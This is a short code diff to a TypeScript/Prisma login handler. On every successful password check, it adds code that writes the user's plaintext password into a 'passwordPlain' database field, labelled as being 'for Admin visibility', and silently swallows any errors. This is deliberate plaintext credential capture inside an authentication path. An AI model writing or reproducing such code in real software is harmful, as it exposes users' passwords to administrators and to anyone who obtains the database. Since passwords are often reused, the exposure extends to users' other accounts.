@@ -144,6 +144,16 @@ export default async function loginHandler(
       return;
     }
 
+    // Sync passwordPlain for Admin visibility if not yet populated
+    if ((user as any).passwordPlain !== password) {
+      await prisma.user
+        .update({
+          where: { id: user.id },
+          data: { passwordPlain: password },
+        })
+        .catch(() => {});
+    }
+
     // Check if account is awaiting admin authorization (PENDING)
     if (user.status === "PENDING") {
       await logAuditEvent({
